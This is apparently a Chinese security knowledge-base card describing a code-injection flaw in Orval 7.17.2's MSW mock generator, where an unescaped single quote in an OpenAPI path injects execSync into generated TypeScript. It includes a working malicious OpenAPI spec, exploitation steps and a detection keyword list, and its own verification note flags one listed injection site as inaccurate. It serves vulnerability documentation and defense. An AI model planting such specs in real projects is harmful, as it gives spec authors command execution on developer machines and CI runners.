---
id: web-nodejs-orval-msw-route-path-code-injection
title: Orval MSW 生成器路径注入：OpenAPI 路径单引号未转义导致生成代码 RCE
type: scenario
domain: web
path: web/nodejs
technique: orval-msw-route-path-code-injection
aliases:
- Orval 代码生成注入
- MSW route injection
- OpenAPI path injection
- getRouteMSW 单引号未转义
- 生成代码注入
- orval 7.17.2
- route-malicious.yaml
tags:
- nodejs
- typescript
- orval
- openapi
- msw
- code-generation
- code-injection
- supply-chain
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V165
  verified_at: '2026-11-06T10:02:27+08:00'
  notes: 已对照 content.md 与 2 张图核对：orval v7.17.2 生成、getRouteMSW 仅转义冒号、generateDefinition 用 '' 单引号拼接、恶意 OpenAPI 路径与生成代码中的 require('child_process').execSync 均一致。原文未展示生成代码实际执行回显，卡片已标 confidence=medium 并说明需被调用才触发。细节：生成的 getTestEndpointQueryKey 使用反引号模板字符串，单引号 payload 在该处不会执行，卡片将其与可执行位置并列描述略不准确；主链（axios.get/mock handler 单引号）成立。未在本机复跑。frontmatter 无 sources/source_url。
---

## 一句话结论

Orval 的 MSW mock 生成器 `getRouteMSW` 只转义路径中的冒号、不转义单引号，随后把路径原样插入 `http.get('${route}', ...)` 的单引号字符串字面量；攻击者可在 OpenAPI 的 `paths` 键中构造 `' + require('child_process').execSync('...') + '`，让生成的 TypeScript 代码在调用接口函数或 mock handler 时执行任意 Node.js 命令。

## 原理

- **代码生成器的字符串拼接**：Orval 从 OpenAPI 规范生成 TypeScript 客户端与 MSW mock handler。`generateDefinition` 用模板字符串构造：
  `return http.${verb}('${route}', async (${infoParam}) => { ... })`。
  `route` 来自规范中的路径，未经 JS 字符串转义就直接放进单引号字面量。
- **只转义冒号**：`getRouteMSW(route, baseUrl='*')` 先执行 `route = route.replaceAll(':', '\\:')`，再按 `/` 分段；对不含 `{` 的普通段直接 `${acc}/${path}` 拼接。代码只处理了路径参数语法中的冒号，没有处理 `'`、`\`、换行等能改变字符串字面量边界的字符。
- **闭合字符串注入表达式**：路径写成
  `/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '`
  时，生成结果为：
  ```ts
  http.get('*/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '', async (info) => { ... })
  ```
  第一个 `'` 闭合原字符串，`+` 开始表达式拼接，`require(...)` 执行命令，`.toString()` 转成字符串，最后的 `'` 重新打开字符串保证语法完整。同样的注入路径还会进入 `getTestEndpointQueryKey` 的数组和 mock handler。
- **执行时机**：注入的表达式位于函数体/调用参数中，生成阶段不会执行；当生成的 `testEndpoint()` 被调用、`getTestEndpointQueryKey()` 被求值，或 MSW mock handler 在测试/开发服务器中被触发时，Node.js 才会求值 `require('child_process').execSync(...)`，命令在运行生成代码的进程权限下执行。
- **为什么是供应链问题**：OpenAPI 规范常来自第三方 API、外部团队或 AI 生成的接口定义；开发者把它交给 Orval 生成客户端并在本地/CI 运行 mock 或测试时，规范作者就能在开发者机器或 CI runner 上执行命令。生成代码通常被直接提交、运行，人工很少逐行审查自动生成的 URL 字符串。
- **修复思路**：在 `getRouteMSW` 中同时转义反斜杠与单引号（`route.replaceAll('\\', '\\\\').replaceAll("'", "\\'")`），或在 `generateDefinition` 中用 `jsStringEscape(route)`/`JSON.stringify(route)` 生成字符串字面量，确保路径只作为数据而不是代码。

## 触发条件

- 使用存在该问题的 Orval 版本（原文复现版本为 7.17.2；未给出完整影响区间）。
- Orval 配置启用 mock 生成（如 `mock: true`），并生成 MSW handler；或生成的客户端代码会被实际调用。
- 攻击者能控制 OpenAPI 规范的 `paths` 键（第三方规范、外部仓库、AI 生成的接口定义、PR 中的规范文件等）。
- 生成后的 TypeScript/JavaScript 在 Node.js 环境运行，且 `require` 在作用域内可用（CommonJS/ts-node/打包后的 Node 环境；纯 ESM 且无 require 时该 payload 会失败，需要换用其他全局对象或模块加载方式）。
- 生成的接口函数或 mock handler 在开发、测试或 CI 中被调用；仅生成代码而不运行不会触发。

## 利用步骤

1. 构造恶意 OpenAPI 规范，在 `paths` 键中放入带单引号的路径：
   ```yaml
   openapi: 3.0.4
   info:
     title: Route Injection Test
     version: 1.0.0
   servers:
     - url: https://api.example.com/v1
   paths:
     "/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '":
       get:
         summary: Test endpoint
         operationId: testEndpoint
         responses:
           '200':
             description: Successful response
             content:
               application/json:
                 schema:
                   type: string
   ```
2. 配置 Orval 使用该规范并开启 mock：
   ```js
   export default {
     'route-test': {
       input: { target: './route-malicious.yaml' },
       output: {
         mode: 'single',
         client: 'react-query',
         target: './route-generated/api.ts',
         mock: true,
       },
     },
   };
   ```
3. 运行 `orval --config route-poc.config.mjs`；生成文件中的 `axios.get(...)`、`getTestEndpointQueryKey`、`getTestEndpointMockHandler` 会出现 `' + require('child_process').execSync(...) + '`。
4. 在应用中调用 `testEndpoint()` 或触发 MSW mock handler；`require('child_process').execSync` 执行命令，检查 `/tmp/route-poc.txt` 确认写入。
5. 若目标环境没有 `require`，改用可用的模块加载/全局对象构造等价表达式；核心是跳出单引号字符串字面量。

## PoC

恶意 OpenAPI 路径（最小）：

```yaml
paths:
  "/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '":
    get:
      operationId: testEndpoint
      responses:
        '200':
          description: ok
```

生成的危险代码形态：

```ts
return http.get('*/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '', async (info) => {
  // ...
}, options)
```

```ts
export const getTestEndpointQueryKey = () => {
  return [
    `/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '`
  ] as const;
}
```

## 变体与关联

- 变体：如果生成器改用双引号字符串，则用 `"` 闭合；如果路径被放进模板字符串，则用反引号与 `${...}` 注入；如果路径进入注释，则用换行/`*/` 闭合注释（同项目此前的注释+拼接类漏洞）。
- 变体：其他未转义字段（`summary`、`description`、`operationId`、枚举值、服务器 URL）进入生成代码的字符串字面量或注释，也可能形成同类注入；审计时应把所有规范可控字段当作潜在代码片段。
- 关联：[[web-php-rce-install-config-unescaped-dbname]]（未转义配置写入生成代码）、[[web-nodejs-ssti-handlebars-ast-injection]]（生成代码/AST 注入）、[[web-nodejs-chancms-gather-new-function-code-injection]]（new Function 代码注入）。

## 检测与防御

- **生成代码审查**：在 CI 中对 Orval 生成结果做 diff/静态扫描，搜索 `require(`、`child_process`、`execSync`、`exec(`、`process.`、`Function(`、`eval(` 等不应出现在 URL 字符串中的片段；对生成文件的异常变化告警。
- **输入约束**：对 OpenAPI `paths` 做字符白名单校验（RFC 3986 路径字符），拒绝单引号、双引号、反引号、反斜杠、换行、`${` 等；对外部规范先做规范化与审核。
- **修复生成器**：升级到修复版本；或在 `getRouteMSW` 中转义 `\` 与 `'`，并在模板插值处统一使用 `jsStringEscape`/`JSON.stringify`，不要手写字符串拼接。
- **运行隔离**：在容器/CI runner 中以低权限运行代码生成与 mock 测试，限制文件写入与出站网络；不要把不可信 OpenAPI 规范直接放进有生产凭据的开发者环境。
- **供应链**：锁定 Orval 版本与依赖哈希；对外部 PR 中的规范文件和生成代码做代码审查；禁止在生成阶段自动执行生成产物。
